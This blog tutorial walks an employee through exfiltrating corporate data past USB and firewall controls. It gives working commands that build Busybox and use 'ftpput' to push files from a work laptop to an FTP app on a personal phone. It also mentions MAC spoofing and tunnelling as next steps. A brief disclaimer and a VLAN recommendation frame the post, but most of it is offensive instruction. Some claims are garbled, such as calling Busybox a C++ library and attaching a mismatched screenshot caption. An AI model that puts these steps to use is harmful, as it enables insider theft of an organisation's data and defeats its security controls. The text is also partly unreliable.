---
title: Exfiltrating data from a bank
author: hugo
date: 2023-04-04 09:11:00 +0200
categories: [Tutorial, security]
tags: [hacking, android, cmake]
render_with_liquid: false
---


> This tutorial will guide you through the process of bypassing security procedures from your employer. The author gives this example for educational purposes and does not incentivise you to apply these techniques without prior consent
{: .prompt-info }


## The art of deception

_The best defense is a good offense_. Once you're able to set this up and try it yourself you'll get a good grasp of how this attack works and what your employer should do to improve their security. Let's define what we mean by "insecure design".

<em>Insecure Design is a category of weaknesses that originate from missing or ineffective security controls. Some applications are built without security in mind. Others do have a secure design, but have implementation flaws that can lead to exploitable vulnerabilities.</em> [`A04:2021—Insecure Design`](https://www.imperva.com/learn/application-security/owasp-top-10/).

Today's exercise is a quick showcase of a C++ library called Busybox. Head over to busybox's [download page](https://busybox.net/downloads/) to build this library from source. I'll go over the setup in the next section so if that's what you came for you can skip the next couple paragraphs.

![click-jacking success](/assets/img/posts/2023-04-04_02-25.png){: width="100%"}

If you've worked in corporate environments you'll know that moving data around is impossible to do with regular USB mass storage devices. These measures are in place to prevent fraud or data theft. Most vendors like microsoft or red hat linux and citrix provide ways to block the usage of these mass storage devices as well. The picture above showcases how to enable this security measure on Windows 10.

So how would a hacker go about exfiltrating data out of this corporate environment? Well there are multiple ways of going about it and it will largely depend on your constraints. Most corporate clients these days will shield their systems and employees from the internet by using firewalls like pfsense that manage a black list of websites that go against the company's policies. You won't be surprised to know that trello, github, gitlab, excel online, google sheets, dropbox or any of those services have to be blocked in order to avoid the risk of someone (accidently) storing data on those services.

However, corporate or not most companies will need developers to work on their codebase who will lobby against these security measures to have a certain degree of openness and allow them to shamelessly copy open source projects. Compromises will therefore have to be made.

A friend told me once he remembers working at client site and suddenly being blocked from downloading his python libraries from pypi.org which is (as far as I know) the single biggest repository out there. This measure had come about because trojan and viruses were being discovered by security researchers on pypi and published in the news. Management's natural reaction was to block the whole thing alltogether. Thankfully for him, they blocked the proxy used by "pip" but forgot that you could just as well download and install your libraries from source on [pypi's](https://pypi.org/) website so that measure didn't stop or help security. The only option that would have made sense would have been to create a central repo administered by engineers who examined the software line by line before accepting external libraries. I'm sure RHEL or Microsoft have found ways to do that and probably already sell those services to corporate clients.

## Strategy and setting up your work bench

The plan is to set Busybox as a relay and send our data to our phones via the file transfer protocol (FTP). I used an app called "WiFi FTP Server" on google's play store but I'm sure any FTP app will do.

Let's now unzip the c++ library and create the Busybox executable with the next two commands.

```console
    [waz@localhost]# make defconfig
    [waz@localhost]# make
    
```

In case you want to add Busybox to your path and be able to run it anywhere on your system run `sudo make install instead`. You probably won't have superuser privileges on your corporate laptop so let's stick with our user executable.

## Sending and receiving files

Let's try sending a test file. Start up your ftp server on your phone and note down your phone's IP and port number. In order to send a file to your phone the only command you'll need is 

```console
    [waz@localhost]# echo "It works !" > data.txt
    [waz@localhost]# busybox ftpput 192.168.178.43:2221 data.txt
    
```

You can always add the -v option to the command above to have more information on what's happening under the hood.

We've just uploaded a file onto our phone but what if we needed to download some legally obtained torrents to stream a tv show during work hours? Well that can be done with the exact same process using the `ftpget` command instead. 

## Video

I like to add a small clip to showcase what was said so far. Enjoy !

<div style="padding-top: 5px; padding-bottom: 5px; position:relative; display:block; width: 100%; min-height:400px">

<iframe width="100%" height="400px" src="https://youtube.craftstudios.shop/uploads/netgear/Videos/chirpy/2023-04-04%2021-02-59.mp4" title="YouTube video player" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

</div>

## Conclusion

Exfiltrating data from banks is not an easy endeavour but thankfully there are holes in the security policies that make it so much easier. This phone pairing was possible because the phone was able to connect to the same network as the laptop. What a coporate client could have done to combat this type of attack is to simply seggregate its devices into different virtual local area networks (VLANs for the nerds out there). The laptops supplied to the employees have mac addresses that would assign them to VLAN 1 for example while any other employee device would connect to VLAN2. By using this setup you would prevent devices from VLAN 2 from communicating with devices on VLAN 1.

In this hypothetical scenario where the employer did implement separate VLANs the hacker could instead send his ftp requests over to a server on the internet instead or spoof the mac address of the company's laptop but that is out of scope of this tutorial. The request would probably get blocked by the ftp port being closed by a firewall or security policy anyway so let's leave that analysis for a future article. I might write a follow up to this article on how to do spoofing or how to modify the ip tables that route the laptop's traffic to re-route our ftp traffic through an SSH, VPN or SOCKSv5 connecion. 

Thank you for reading this far.

Take care
